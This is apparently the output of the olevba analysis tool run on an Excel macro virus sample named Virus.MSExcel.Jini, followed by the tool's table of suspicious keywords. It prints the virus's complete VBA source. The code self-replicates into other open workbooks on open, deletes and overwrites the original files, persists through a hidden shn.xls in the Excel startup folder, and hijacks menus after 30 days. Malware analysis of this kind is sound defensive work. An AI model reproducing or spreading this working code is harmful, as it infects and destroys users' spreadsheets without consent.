olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jini-f71cb5b60def971b349568343dd64d4d6ccd5c62
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jini-f71cb5b60def971b349568343dd64d4d6ccd5c62 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Jini-f71cb5b60def971b349568343dd64d4d6ccd5c62 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Jini-f71cb5b60def971b349568343dd64d4d6ccd5c62 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim infperiod As String
Sub auto_open()
'Application.DisplayStatusBar = False
Application.ScreenUpdating = False
'abc = MsgBox("AA", vbYesNo)
On Error Resume Next
'openworkbooks = Workbooks.Count
For Each w In Workbooks
    If w.Name <> ActiveWorkbook.Name Then
nameis = w.Name
virustag = Workbooks(nameis).Sheets("shn").Range("A1").Value
If Left(nameis, 4) <> "Book" And virustag = Empty Then
infectedworkbook = ActiveWorkbook.Name
tobeinfected = Workbooks(nameis).FullName
namesavetoreopen = Workbooks(infectedworkbook).FullName
totalworksheets = Workbooks(nameis).Worksheets.Count
totalworksheets2 = Workbooks(infectedworkbook).Worksheets.Count
Workbooks(infectedworkbook).Sheets("Shn").Visible = True
Application.DisplayAlerts = False
For Each ws In Worksheets
    If ws.Name <> "shn" Then
    ws.Delete
    End If
Next ws
Workbooks(nameis).Worksheets.Copy Before:=Workbooks(infectedworkbook).Sheets("shn")
Workbooks(infectedworkbook).Sheets("shn").Visible = False
Workbooks(nameis).Close savechanges = False
Kill tobeinfected
Workbooks(infectedworkbook).SaveAs tobeinfected
Workbooks.Open namesavetoreopen
End If
End If
virustag = Empty
Next
xlstartpath = Application.StartupPath
shnfile = Dir(xlstartpath & "\shn.xls")
If shnfile = "" Then
infectedworkbook = ActiveWorkbook.Name
namesavetoreopen = Workbooks(infectedworkbook).FullName
Workbooks(infectedworkbook).Sheets("Shn").Visible = True
Application.DisplayAlerts = False
For Each ws In Worksheets
    If ws.Name <> "shn" Then
    ws.Delete
    End If
Next ws
Workbooks(infectedworkbook).Sheets("Shn").Range("B76").Value = Date
ActiveWindow.Visible = False
Workbooks(infectedworkbook).SaveAs xlstartpath & "\shn.xls"
'Application.EnableEvents = False
Workbooks.Open namesavetoreopen
'Windows("shn.xls").Close savechanges = True
'Application.EnableEvents = True
End If
shfstq
'Application.OnTime Now + TimeValue("00:00:30"), "check_files"
End Sub
Sub shfstq()
'abc = MsgBox("Checking files", vbYesNo)
Application.ScreenUpdating = False
On Error Resume Next
If IsError(aa = ActiveWorkbook.Name) = True Then
Else
showworkbook = ActiveWorkbook.Name
End If
'openworkbooks = Workbooks.Count
For Each w In Workbooks
    If w.Name <> "shn.xls" Then
nameis = w.Name
virustag = Workbooks(nameis).Sheets("shn").Range("A1").Value
If Left(nameis, 4) <> "Book" And virustag = Empty Then
infectedworkbook = "shn.xls"
tobeinfected = Workbooks(nameis).FullName
namesavetoreopen = Workbooks(infectedworkbook).FullName
totalworksheets = Workbooks(nameis).Worksheets.Count
'totalworksheets2 = Workbooks(infectedworkbook).Worksheets.Count
Windows(infectedworkbook).Visible = True
Application.DisplayAlerts = False
Workbooks(nameis).Worksheets.Copy Before:=Workbooks(infectedworkbook).Sheets("shn")
Workbooks(infectedworkbook).Sheets("shn").Visible = False
Workbooks(nameis).Close savechanges = False
Kill tobeinfected
Workbooks(infectedworkbook).SaveAs tobeinfected
Workbooks.Open namesavetoreopen
Workbooks(showworkbook).Activate
End If
End If
virustag = Empty
Next
xlstartpath = Application.StartupPath
shnfile = Dir(xlstartpath & "\shn.xls")
If shnfile = "" Then
Workbooks("shn.xls").SaveAs xlstartpath & "\shn.xls"
End If
infperiod = Date - Workbooks("shn.xls").Sheets("shn").Range("B76").Value
If infperiod > 30 Then
Application.Run ("shn.xls!aista")
Application.Run ("shn.xls!payghamat")
End If

Application.OnTime Now + TimeValue("00:02:00"), "shn.xls!shfstq"
End Sub
Sub aista()
On Error Resume Next
Set mymenubar = CommandBars.ActiveMenuBar.Controls.Item(1)
'mymenubar.Delete
Set mymenubars = mymenubar.Controls.Item(1)
alread = mymenubars.Caption
If alread <> "Naya" Then
ST = 77
For changemenu = 1 To 12
Set mymenubars = mymenubar.Controls.Item(changemenu)
mymenubars.Caption = Workbooks("shn.xls").Sheets("shn").Range("A" & ST).Value
mymenubars.OnAction = "shn.xls!payghamat"
ST = ST + 1
Next
Set mymenubars = mymenubar.Controls.Item("E&xit")
mymenubars.OnAction = "shn.xls!payghamat"
End If
End Sub
Sub payghamat()
Randomize
row1 = Rnd()
row1 = Int(row1 * 10)
If row1 > 0 Then
msgis = Workbooks("shn.xls").Sheets("shn").Range("K" & row1).Value
headis = Workbooks("shn.xls").Sheets("shn").Range("P" & row1).Value
aa = MsgBox(msgis, , headis)
Else
virmsg = MsgBox("Hye. You have just got me." & Chr(13) & "It's shani a little jini. You may call me a virus in your termenology" & Chr(13) & "It's a good idea taking backup of you files." & Chr(13) & "I am freindly but get wild sometimes", vbExclamation, "It looks like you have caught up by a VIRUS")
End If
End Sub




-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  sh
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

